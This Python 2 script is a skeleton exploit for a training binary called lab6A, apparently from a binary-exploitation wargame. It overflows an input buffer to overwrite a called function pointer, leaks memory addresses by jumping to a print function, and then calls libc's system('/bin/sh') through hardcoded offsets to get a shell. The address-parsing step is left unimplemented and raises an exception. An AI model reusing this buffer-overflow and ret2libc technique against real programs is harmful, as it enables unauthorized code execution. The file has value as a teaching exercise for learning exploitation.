#!/usr/bin/python

#
# THIS IS A SKELETON CODE FOR THE lab6A EXPLOIT.
# Nothing is working at the moment here, since a interpret_leakage
# function is not implemented yet.
#

import subprocess
import struct
import fcntl
import time
import sys
import os


#VULN_APP = '/levels/lab06/lab6A'
VULN_APP = '/tmp/lab6a/lab6A'

BASE_ADDR = 0xb77b0000
LIBC_BASE = 0xb75d3000

libc_bin_sh_string_offset = 0x160a24
libc_system_offset = 0x40190
#print_name_offset = 0xbe2
print_name_offset = 0x95c


def conv(x):
    return struct.pack("<I", x)

def readall(p):
    fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    p.stdout.flush()
    out = ''
    while True:
        try:
            out += p.stdout.read()
        except:
            break
    return out

def write(p, a):
    p.stdin.write(a + "\n") 
    p.stdin.flush()
    time.sleep(.1)
    return readall(p)

def exploit(p, ret_addr, param = 0):

    print "-- Crafting exploit for ret addr: 0x%08x (param: 0x08%x)" % (ret_addr, param)

    # Enter setup account submenu
    write(p, "1")

    # Type your name and description part
    data = "A" * 31
    assert len(data) == 31
    out0 = write(p, data)
    
    data = "B" * 90
    data += conv(ret_addr)
    data += "CCCC" # junk

    if param != 0:
        data += conv(param)

    data += "D" * (127 - len(data))

    assert len(data) == 127
    out1 = write(p, data)

    # Calling overwritten pointer (call eax)
    out2 = write(p, "3")

    return out0 + out1 + out2

def hex_dump(data):
    s = ''
    n = 0
    lines = []

    if len(data) == 0:
        return '<empty>'

    for i in range(0, len(data), 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % ord(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (ord(data[j]) < 0x20 or ord(data[j]) > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)

def interpret_leakage(ret):
    stack_base = 0
    image_base = 0
    libc_base = 0

    if len(ret) == 0:
        return 0, 0, 0

    #
    # TO BE IMPLEMENTED
    # 
    raise Exception("interpret_leakage function has not yet been implemented.")

    print "------ LEAKAGE -------"
    print hex_dump(ret)
    print "------ LEAKAGE -------"

    return stack_base, image_base, libc_base

if __name__ == '__main__':

    if len(sys.argv) > 1:
        BASE_ADDR = int(sys.argv[1], 16)
        print "Base address changed to: 0x%08x" % BASE_ADDR

    if len(sys.argv) > 2:
        LIBC_ADDR = int(sys.argv[2], 16)
        print "libc address changed to: 0x%08x" % LIBC_ADDR

    leak_func_addr = BASE_ADDR + print_name_offset

    # Launch the app
    #app = [VULN_APP,]
    
    # Launch strace running the app
    app = ["strace", "-f", VULN_APP,]

    p = subprocess.Popen(app, 
                        stdout=subprocess.PIPE, 
                        stdin=subprocess.PIPE)

    # Phase 1: Brute-force'ing 
    ret = exploit(p, leak_func_addr)
    stack_base, image_base, libc_base = interpret_leakage(ret)

    if stack_base == 0 or image_base == 0 or libc_base == 0:
        print 'Failed to leak addresses.'

    else:
        system_addr = libc_base + libc_system_offset
        bin_sh_string = libc_base + libc_bin_sh_string_offset

        # Phase 2: Exploit: invoke system(/bin/sh)
        exploit(p, system_addr, bin_sh_string)

    p.communicate()[0]
    try:
        p.kill()
    except:
        pass

